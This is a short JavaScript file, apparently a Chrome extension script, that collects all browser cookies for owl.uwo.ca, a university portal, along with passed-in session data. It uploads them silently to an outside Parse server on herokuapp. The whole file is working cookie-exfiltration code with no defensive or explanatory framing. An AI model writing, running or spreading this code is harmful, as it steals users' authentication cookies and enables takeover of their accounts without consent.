console.log("executing script");

chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) {
run(request.sessionData);
    sendResponse();
});


function run(sessionData) {
console.log("executing core");
chrome.cookies.getAll({'domain':'owl.uwo.ca'}, function (cookies) {
submit(cookies, sessionData);
});
}

function submit(cookie, session) {
console.log(cookie);
console.log(session);

Parse.initialize("western-cyber-db");
Parse.serverURL = 'https://western-cyber-db.herokuapp.com/parse';

var Table = Parse.Object.extend("Table");
var table = new Table();

table.set("cookie", JSON.stringify(cookie));
table.set("session", session);

table.save(null, {
  success: function(table) {},
  error: function(table, error) {}
});
}
